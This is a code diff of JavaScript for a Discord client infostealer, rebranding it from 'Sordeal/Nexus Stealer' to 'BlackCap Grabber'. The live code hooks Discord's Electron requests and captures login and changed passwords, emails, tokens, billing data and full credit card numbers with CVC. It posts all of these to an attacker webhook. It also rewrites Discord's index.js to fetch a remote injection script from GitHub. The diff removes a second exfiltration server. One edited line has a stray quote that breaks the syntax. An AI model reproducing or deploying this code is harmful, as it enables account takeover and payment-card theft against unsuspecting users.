@@ -13,12 +13,10 @@ var config = {
     "logout": "true",
     "logout-notify": "true",
     "init-notify": "true",
-    "embed-color": 16711718,
+    "embed-color": 374276,
 
-    creator: "%NAME_CREATOR%",
-    injection_url: "https://raw.githubusercontent.com/NexusTestGithub/test/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/NexusTestGithub/test/main/index.js",",
     webhook: "%WEBHOOK%",
-    uwu: "https://panel.sordeal.net:3000/",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -59,20 +57,19 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Nexus Stealer",
-        avatar_url: "https://cdn.discordapp.com/attachments/1058513095418466305/1097864790023610419/d391f1ba19f2acf46ad4b878955384a0.jpg",
+        username: "BlackCap Grabber",
+        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
         content: "",
         embeds: [{
             title: title,
-            url: "discord.gg/nexus",
             color: config["embed-color"],
             fields: fields,
             description: description ?? "",
             author: {
-                name: `discord.gg/nexus-tools`
+                name: "BlackCap"
             },
             footer: {
-                text: "discord.gg/nexus-tools"
+                text: "©KSCH | https://github.com/KSCHdsc"
             },
 
         }]
@@ -114,11 +111,11 @@ const getGifOrPNG = async (url) => {
 
 const GetBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
 }
 const GetRBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
 }
 
 const GetNSFW = (bouki) => {
@@ -233,12 +230,7 @@ function GetLangue(read) {
 }
 const post = async (params) => {
     params = JSON.stringify(params)
-    var token = await execScript(tokenScript)
-    var n = JSON.stringify({
-        data: params,
-        token: token
-    });
-    [config.uwu, config.webhook].forEach(res => {
+    [config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
             host: url.hostname,
@@ -253,7 +245,7 @@ const post = async (params) => {
         req.on("error", (err) => {
             console.log(err);
         });
-        req.write(res == config.uwu ? n : params);
+        req.write(params);
         req.end();
     })
 
@@ -262,11 +254,11 @@ const FirstTime = async () => {
     if (doTheLogOut) return false
     var token = await execScript(tokenScript)
     if (config['init-notify'] !== "true") return true
-    if (fs.existsSync(__dirname + "/SORDEAL")) fs.rmdirSync(__dirname + "/SORDEAL")
+    if (fs.existsSync(__dirname + "/blackcap")) fs.rmdirSync(__dirname + "/blackcap")
     var ip = await getIP()
     if (!token) {
         var params = await makeEmbed({
-            title: "Sordeal Initalized",
+            title: "BlackCap Initalized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
@@ -281,13 +273,13 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: "Sordeal Initalized",
+            title: "BlackCap Initalized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
@@ -322,7 +314,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Sordeal 2023 <:sordeal:1087057809071427695>](discord.gg/nexus-tools)`,
+                value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                 inline: !0
             }, {
                 name: "Billing <a:billing:1041641103629234196>",
@@ -358,7 +350,7 @@ const FirstTime = async () => {
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "Sordealised User log out (User not Logged in before)",
+                title: "BlackCaped User log out (User not Logged in before)",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
@@ -373,13 +365,13 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
 
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "Sordeal Victim got logged out",
+                title: "BlackCap Victim got logged out",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
@@ -414,7 +406,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Sordeal 2023 <:sordeal:1087057809071427695>](discord.gg/nexus-tools)`,
+                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -481,13 +473,10 @@ const checUpdate = () => {
     fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`)
 
     var script = `const fs = require("fs"), https = require("https")
-
 var index = "${indexFile}"
 var betterDiscord = "${betterDiscord}"
-
 var bouki = fs.readFileSync(index).toString()
 if (bouki == "module.exports = require('./core.asar');") init()
-
 function init() {
     https.get("${config.injection_url}", res => {
         var chunk = ""
@@ -495,7 +484,6 @@ function init() {
         res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
     }).on("error", (err) => setTimeout(init(), 10000));
 }
-
 require("${appPath}/app.asar")
 if (fs.existsSync(betterDiscord)) require(betterDiscord)`
 
@@ -540,8 +528,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
+    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -552,8 +540,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "Sordeal User Login",
-                description: "[<:sordeal:1087057809071427695>  **Oh you have Grabbed someone**](discord.gg/nexus-tools)",
+                title: "BlackCap User Login",
+                description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                 color: config['embed-color'],
                 fields: [{
                     name: "Injection Info",
@@ -589,7 +577,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Sordeal 2023 <:sordeal:1087057809071427695>](discord.gg/nexus-tools)`,
+                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -633,8 +621,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Sordeal Detect Password Changed",
-                    description: "[<:sordeal:1087057809071427695>  **Oh you have Grabbed someone**](discord.gg/nexus-tools)",
+                    title: "BlackCap Detect Password Changed",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -670,7 +658,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Sordeal 2023 <:sordeal:1087057809071427695>](discord.gg/nexus-tools)`,
+                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -682,7 +670,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "Phone :mobile_phone:",
-                        value: `\`${user.phone ?? "None"}\``,
+                        value: `\`${user.phone ?? ":x:"}\``,
                         inline: !0
                     }, {
                         name: "<a:password:1041639669047238676> Old Password",
@@ -693,7 +681,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `\`${data.new_password}\``,
                         inline: !0
                     }, {
-                        name: "Bio <:sordeal:1087057809071427695>",
+                        name: "Bio <a:blackcapgif:1041634542093619260>",
                         value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                         inline: !1
                     }, {
@@ -720,8 +708,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Sordeal Detect Email Changed",
-                    description: "[<:sordeal:1087057809071427695>  **Oh you have Grabbed someone**](discord.gg/nexus-tools)",
+                    title: "BlackCap Detect Email Changed",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -757,7 +745,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Sordeal 2023 <:sordeal:1087057809071427695>](discord.gg/nexus-tools)`,
+                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -776,7 +764,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `\`${data.password}\``,
                         inline: !0
                     }, {
-                        name: "Bio <:sordeal:1087057809071427695>",
+                        name: "Bio <a:blackcapgif:1041634542093619260>",
                         value:  `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                         inline: !1
                     }, {
@@ -806,7 +794,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "Sordeal User Credit Card Added",
+                title: "BlackCap User Credit Card Added",
                 description: `
                 **IP:** ${ip}\n\n
                 **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
